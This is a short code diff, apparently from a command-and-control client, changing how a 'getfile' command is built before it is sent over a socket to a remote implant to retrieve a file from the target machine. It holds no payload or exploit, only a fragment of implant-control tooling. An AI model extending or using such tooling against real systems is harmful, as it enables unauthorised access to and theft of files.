@@ -12,7 +12,7 @@ def handleGetFile(sock : socket.socket, target_file_path : str, local_file_path 
 
     # Send our command to the implant 
     # getfile -> CommandDetails -> Command
-    getfile_path = Common.GetFileCommand(filepath=ctypes.c_char_p(target_file_path.encode('utf-8')))
+    getfile_path = Common.GetFileCommand(filepath=target_file_path.encode('utf-8'))
     getfile_details = Common.CommandDetails(getfilecommand=getfile_path)
     getfile_command = Common.Command(command=Common.Commands.getfile, commanddetails=getfile_details)
 
